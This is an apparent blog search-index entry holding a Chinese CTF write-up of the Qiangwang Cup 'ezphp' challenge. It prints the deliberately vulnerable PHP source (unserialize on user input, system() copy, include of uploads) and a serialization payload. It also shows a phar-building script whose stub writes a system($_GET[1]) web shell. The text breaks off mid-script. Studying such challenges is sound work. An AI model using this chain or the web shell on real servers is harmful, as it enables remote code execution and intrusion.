<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>强网杯s9尝试复现</title>
    <link href="/2026/01/22/%E5%BC%BA%E7%BD%91%E6%9D%AFs9%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0/"/>
    <url>/2026/01/22/%E5%BC%BA%E7%BD%91%E6%9D%AFs9%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-s9-尝试复现"><a href="#强网杯-s9-尝试复现" class="headerlink" title="强网杯 s9 尝试复现  "></a>强网杯 s9 尝试复现  </h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>tags: 反序列化，php匿名类调用，phar传马，suid提权</p><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>)</span>&#123;<span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];&#125;<span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;&#125;<span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable language_">$this</span>-&gt;readflag = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] == <span class="hljs-number">0</span>) &#123;<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&#x27;*&#x27;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);&#125;<span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-string">&#x27;jpg&#x27;</span>;<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-variable">$uploadPath</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-variable">$newFilename</span>; <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cp &quot;</span>.<span class="hljs-variable">$uploadedFile</span>.<span class="hljs-string">&quot; &quot;</span>. <span class="hljs-variable">$uploadPath</span>)) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success upload!&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;&#125;&#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-title function_ invoke__">phpinfo</span>();&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<span class="hljs-variable">$file</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/:\/\//&#x27;</span>, <span class="hljs-variable">$file</span>))<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal content detected in the file.&quot;</span>);&#125;<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);&#125;&#125;&#125;&#125;;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;f;<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag;<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>)<span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>();<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<span class="hljs-variable">$func</span>();&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);&#125;&#125;&#125;<span class="hljs-variable">$ser</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;land&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;land&#x27;</span>] : <span class="hljs-string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>ai反混淆之后：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 生成指定长度的随机小写字母字符串</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>&#125;<br><br><span class="hljs-comment">// 设置时区为上海</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><br><span class="hljs-comment">// 定义 test 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 初始化 readflag 属性为匿名类实例</span><br>        <span class="hljs-variable language_">$this</span>-&gt;readflag = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-comment">// 文件上传处理逻辑</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>); <span class="hljs-comment">// 当前时间的小时和分钟（如 1423）</span><br>                    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>                    <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br>                    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>); <span class="hljs-comment">// 设置随机种子</span><br><br>                    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br>                    <br>                    <span class="hljs-comment">// 删除 uploads 目录下所有旧文件</span><br>                    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&#x27;*&#x27;</span>);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-comment">// 生成随机字符串作为文件名的一部分</span><br>                    <span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>                    <span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br>                    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>                    <span class="hljs-variable">$uploadPath</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-comment">// 使用 system 复制上传文件（存在命令注入风险）</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cp &quot;</span> . <span class="hljs-variable">$uploadedFile</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$uploadPath</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success upload!&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 反序列化时触发 phpinfo()</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-title function_ invoke__">phpinfo</span>();<br>            &#125;<br><br>            <span class="hljs-comment">// 读取 flag 的方法（嵌套函数定义，实际不会执行）</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>                        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>                        <span class="hljs-comment">// 检查文件名是否包含 &quot;://&quot;</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/:\\/\\//&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br><br>                        <span class="hljs-comment">// 检查文件内容是否包含危险关键字</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\\?|\\:\\/\\/|ph|\\?\\=/i&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal content detected in the file.&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-comment">// 包含文件（可能导致代码执行）</span><br>                        <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;;<br>    &#125;<br><br>    <span class="hljs-comment">// 析构函数：在对象销毁时执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;f;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag; <span class="hljs-comment">// 将 readflag 赋值给全局变量 filename</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 实例化类</span><br>        &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>            <span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 调用函数</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>); <span class="hljs-comment">// 默认显示源码</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 反序列化用户输入</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;land&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;land&#x27;</span>] : <span class="hljs-string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先尝试触发反序列化吧，  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> test;<br><span class="hljs-variable">$a</span>-&gt;f =<span class="hljs-string">&quot;phpinfo&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>对应题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;f;<br>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag; <span class="hljs-comment">// 将 readflag 赋值给全局变量 filename</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 实例化类</span><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>        <span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 调用函数</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>); <span class="hljs-comment">// 默认显示源码</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>note:这里的$func()会把变量$func的字符当做函数来执行  </p><p>根据上传文件的思路：<br>是要触发反序列化上传文件，然后来传马<br>要进入到readflag函数里才能上传文件，但是能看到文件上传的readflag函数在readflag变量里定义的匿名类里，是无法正常调用的。  </p><h3 id="匿名类："><a href="#匿名类：" class="headerlink" title="匿名类："></a>匿名类：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;readflag = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>这里我们能看到，若是直接new readflag是会返回class realflag 不存在的，因为readflag是一个变量名！<br>而上传文件的函数的readflag()在匿名类里，要想上传文件就需要进入到匿名类。  </p><p><img src="/../img/qiangwangbei/1.png"></p><p>这里能看到匿名类的命名规则，在正常的程序会命名在 ‘行数$第几个定义的’<br>直接从路径上调用这个类里函数就能成功调用。  </p><h3 id="phar写马"><a href="#phar写马" class="headerlink" title=".phar写马"></a>.phar写马</h3><p>接下来就是要传马了，能看到php里：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/:\\/\\//&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\\?|\\:\\/\\/|ph|\\?\\=/i&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal content detected in the file.&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-comment">// 包含文件（可能导致代码执行）</span><br>                        <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>正则还是很严格的，<br>看到师傅们的wp是传phar马，以前都不知道有这种东西，学习了。  </p><h3 id="note-phar-传马"><a href="#note-phar-传马" class="headerlink" title="note: phar 传马"></a>note: phar 传马</h3><p>PHP 的 include 触发 Phar 反序列化的条件:<br>不需要 .phar 扩展名！只需要文件内容是合法的 Phar 包，并且文件名中包含 phar 子串即可。</p><p>php的include函数只要一匹配到phar就会把文件当成phar执行，这样就可以写入木马  </p><p>然后去找一个phar写马文件:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exploit.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$stub</span> = <span class="hljs-string">&lt;&lt;&lt;&#x27;STUB&#x27;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">    system(&#x27;echo &quot;&lt;?php system(\$_GET[1]); ?&gt;&quot; &gt; 1.php&#x27;);</span><br><span class="hljs-string">    __HALT_COMPILER();</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">STUB</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$stub</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span 